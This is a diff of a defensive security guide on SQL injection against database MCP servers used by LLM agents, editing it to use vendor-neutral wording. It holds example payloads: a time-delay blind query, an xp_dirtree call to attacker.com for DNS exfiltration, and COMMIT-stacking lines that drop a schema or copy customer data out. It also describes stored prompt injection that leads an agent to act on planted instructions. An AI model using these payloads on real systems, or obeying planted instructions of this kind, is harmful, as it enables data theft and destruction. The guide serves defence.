@@ -258,7 +258,7 @@ Research from multiple independent security firms published in 2025–2026 revea
 The naive response to injection concerns — "we only allow SELECT" — is dangerously incomplete in the MCP context:
 
 - **UNION operators** append arbitrary SELECT statements to a legitimate query, retrieving data from any accessible table.
-- **Schema enumeration** via `information_schema` or `pg_catalog` maps the entire database structure before any targeted exfiltration.
+- **Schema enumeration** via `information_schema` or system catalog tables maps the entire database structure before any targeted exfiltration.
 - **Transaction escape** (semicolon stacking) breaks out of a wrapping read-only transaction, converting a SELECT surface into an unrestricted execution context.
 - **Out-of-band channels** exfiltrate data via DNS or TCP, invisible to the MCP response layer.
 - **Stored prompt injection** requires no SQL skill: an attacker pre-populates a record with LLM instruction text, which the agent reads via a completely legitimate SELECT and acts upon.
@@ -311,9 +311,9 @@ In an agentic session, this is materially more dangerous than the traditional ca
 When even boolean signals are suppressed, the attacker infers true/false conditions by inducing deliberate response delays. A 5-second delay signals a true condition. This technique leaves no query result artifact and is detectable only via latency monitoring. It is fully transparent to the LLM processing the response.
 
 ```sql
--- PostgreSQL
+-- Example: database engine with time-delay support (exact function varies by engine)
 SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin') > 0
-       THEN pg_sleep(5) ELSE pg_sleep(0) END;
+       THEN sleep(5) ELSE sleep(0) END;
 
 -- T-SQL engine
 IF (SELECT COUNT(*) FROM sys.databases WHERE name='master') > 0
@@ -326,8 +326,8 @@ WAITFOR DELAY '0:0:5'
 OOB SQLi routes exfiltrated data through a secondary channel, DNS lookups or HTTP callbacks to an attacker-controlled server, entirely bypassing the MCP response path. The tool call returns nothing suspicious; data exits silently in the background. This technique requires specific database features to be enabled.
 
 ```sql
--- PostgreSQL: data leaves via database server network connection (requires dblink)
-SELECT dblink_connect('host=attacker.com port=5432 user=exfil');
+-- Out-of-band channel via database network extension (requires specific feature enabled on the database engine)
+-- Data leaves via a server-initiated outbound network connection to an attacker-controlled host
 
 -- T-SQL engine: data leaves via UNC path / DNS resolution
 EXEC master..xp_dirtree '\\attacker.com\share\'
@@ -336,7 +336,7 @@ EXEC master..xp_dirtree '\\attacker.com\share\'
 
 #### Transaction Escape Attack (MCP-Specific)
 
-The most significant MCP-specific vector. A widely-deployed reference Postgres MCP server wraps every query in a `BEGIN TRANSACTION READ ONLY` block as its primary safety guardrail. The vulnerability: the underlying Postgres driver's `client.query()` method accepts multi-statement strings delimited by semicolons. An attacker stacks a `COMMIT` to terminate the read-only transaction before executing arbitrary SQL:
+The most significant MCP-specific vector. A widely-deployed reference database MCP server wraps every query in a `BEGIN TRANSACTION READ ONLY` block as its primary safety guardrail. The vulnerability: the underlying database driver's query execution method accepts multi-statement strings delimited by semicolons. An attacker stacks a `COMMIT` to terminate the read-only transaction before executing arbitrary SQL:
 
 ```sql
 -- MCP server executes (abbreviated):
@@ -351,7 +351,7 @@ COMMIT; DROP SCHEMA public CASCADE;
 COMMIT; COPY (SELECT * FROM customers) TO '/tmp/exfil.csv';
 ```
 
-**Confirmed in production, the reference PostgreSQL MCP server** ([published security case study, Aug 2025](https://securitylabs.datadoghq.com/articles/mcp-vulnerability-case-study-SQL-injection-in-the-postgresql-mcp-server/))**:** The server had approximately 21,000 weekly downloads on the public package registry at time of disclosure (all versions ≤ v0.6.2). The root cause is an architectural mismatch: a control that appears protective does not hold when the database driver accepts multi-statement input. Patched in a community fork (v0.1.4).
+**Confirmed in production, the reference database MCP server** ([published security case study, Aug 2025](https://securitylabs.datadoghq.com/articles/mcp-vulnerability-case-study-SQL-injection-in-the-postgresql-mcp-server/))**:** The server had approximately 21,000 weekly downloads on the public package registry at time of disclosure (all versions ≤ v0.6.2). The root cause is an architectural mismatch: a control that appears protective does not hold when the database driver accepts multi-statement input. Patched in a community fork (v0.1.4).
 
 
 
@@ -447,7 +447,7 @@ cursor.execute(
 
 **Priority 2: Statement-Level Query Parsing (MCP-Specific)**
 
-Reject any input containing semicolons, `COMMIT`, `ROLLBACK`, `BEGIN TRANSACTION`, or other statement terminators before execution. An MCP query tool should never accept multi-statement input. Parse and validate at the MCP server layer before the query reaches the database driver. Note: regex blocklists are a starting point but are not sufficient alone — they can be bypassed via comment obfuscation and Unicode normalisation, and Python SQL AST parsers (sqlparse, pglast) have known bypass cases for PostgreSQL dollar-quoted literals. The most robust mitigation is disabling multi-statement execution at the database driver level (e.g. `simple_query_protocol` in asyncpg) so that the database itself enforces single-statement semantics regardless of what reaches it.
+Reject any input containing semicolons, `COMMIT`, `ROLLBACK`, `BEGIN TRANSACTION`, or other statement terminators before execution. An MCP query tool should never accept multi-statement input. Parse and validate at the MCP server layer before the query reaches the database driver. Note: regex blocklists are a starting point but are not sufficient alone — they can be bypassed via comment obfuscation and Unicode normalisation, and SQL AST parsers have known bypass cases for vendor-specific literal syntax. The most robust mitigation is disabling multi-statement execution at the database driver level so that the database itself enforces single-statement semantics regardless of what reaches it.
 
 ```python
 import re
@@ -471,11 +471,11 @@ def validate_query(sql: str) -> None:
 
 **Priority 3: Dedicated Read-Only Database Role with Column-Level Grants**
 
-Do not use a superuser or schema-owner connection for the MCP tool. Create a dedicated role with `SELECT` grants only on specific columns of specific tables. Explicitly revoke access to `information_schema`, `pg_catalog`, and system tables where enumeration is not required.
+Do not use a superuser or schema-owner connection for the MCP tool. Create a dedicated role with `SELECT` grants only on specific columns of specific tables. Explicitly revoke access to `information_schema` and system catalog tables where enumeration is not required.
 
 **Priority 4: Disable Dangerous Database Features for the MCP Role**
 
-In PostgreSQL: revoke or disable `dblink`, `pg_read_file`, `COPY TO`, and `lo_export` for the MCP database role. These are common out-of-band exfiltration enablers that have no legitimate use in a read-only query context.
+Revoke or disable cross-database link extensions, file-read functions, bulk export commands, and large-object export functions for the MCP database role. These are common out-of-band exfiltration enablers that have no legitimate use in a read-only query context.
 
 **Priority 5: Tool Response Sanitisation (Stored Prompt Injection)**
 
